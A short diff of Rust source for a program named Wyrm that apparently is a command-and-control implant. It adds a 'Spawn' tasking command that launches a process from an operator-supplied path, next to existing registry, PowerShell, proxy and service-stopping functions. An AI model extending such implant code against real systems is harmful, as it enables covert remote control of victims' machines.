@@ -48,6 +48,7 @@ use crate::{
         registry::{reg_add, reg_del, reg_query},
         shell::run_powershell,
     },
+    spawn::Spawn,
     utils::{
         comptime::translate_build_artifacts, proxy::resolve_web_proxy,
         strings::generate_mutex_name, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
@@ -329,6 +330,10 @@ impl Wyrm {
                 Command::WhoAmI => {
                     let result = whoami();
                     self.push_completed_task(&task, result);
+                }
+                Command::Spawn => {
+                    let path = task.metadata.unwrap();
+                    Spawn::spawn_sibling(&path);
                 }
             }
         }
